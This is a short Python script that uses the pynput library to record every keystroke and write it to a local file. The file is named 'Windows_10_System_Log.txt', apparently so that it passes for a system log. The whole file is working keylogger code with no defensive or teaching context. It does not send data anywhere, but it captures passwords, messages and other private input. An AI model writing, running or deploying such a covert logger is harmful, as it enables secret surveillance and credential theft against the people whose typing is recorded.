from pynput.keyboard import Key, Listener
import logging

log_directory = ""
my_form = "%(message)s"
file_name = "Windows_10_System_Log.txt"

logging.basicConfig(filename = file_name, level = logging.DEBUG, format = my_form)

def keypress(Key):
    print(Key)
    logging.info(str(Key))
    
    
with Listener(on_press = keypress) as listener:
     listener.join()
